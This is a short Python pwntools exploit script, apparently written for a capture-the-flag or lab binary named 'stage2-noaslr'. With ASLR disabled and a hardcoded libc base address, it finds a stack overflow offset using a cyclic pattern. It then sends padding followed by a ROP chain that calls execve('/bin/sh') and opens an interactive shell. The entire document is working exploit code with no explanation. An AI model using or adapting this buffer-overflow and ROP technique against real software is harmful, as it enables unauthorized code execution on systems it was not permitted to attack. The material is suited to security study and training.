#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = '/bin/sh'
context.aslr = False
context.arch = 'amd64'
context.os = 'linux'

p = process('/home/stage2/stage2-noaslr')
p.recvuntil(b"What's your guess?")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc.address = 0x7ffff7c00000
libc.address = 0x7ffff7d8c000
binAdress = next(libc.search(b"/bin/sh"))
rop = ROP(libc)
rop.execve(binAdress, 0, 0)
substring = pack(0x616161706161616f)
offset = cyclic(80).find(substring)
p.send(b'A' * offset + bytes(rop))

p.interactive()